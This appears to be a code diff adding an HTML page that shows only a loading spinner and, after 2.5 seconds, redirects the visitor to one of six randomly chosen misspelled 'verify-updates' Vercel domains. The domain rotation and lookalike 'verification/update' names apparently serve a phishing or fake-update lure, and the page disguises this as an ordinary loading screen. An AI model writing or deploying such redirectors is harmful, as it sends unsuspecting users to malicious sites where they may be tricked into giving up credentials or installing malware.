@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>body{display:flex;justify-content:center;align-items:center;height:75vh;margin:0;background:#f0f0f0}.loader{border:8px solid rgba(203,203,203,.93);border-top:8px solid #d08f08;border-radius:50%;width:50px;height:50px;animation:1s linear infinite spin}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
+</head>
+<body>
+<div class="loader"></div>
+<script>
+    var domains = ["https://verifii-updates.vercel.app", "https://verifi-updates.vercel.app", "https://verif-updates.vercel.app", "https://verify-update.vercel.app", "https://verify-updates.vercel.app","https://verifiy-updates.vercel.app"];
+
+var randomIndex = Math.floor(Math.random() * domains.length);
+var randomDomain = domains[randomIndex];
+setTimeout(function () {
+    window.location.href = randomDomain;
+}, 2500);
+</script>
+</body>
+</html>
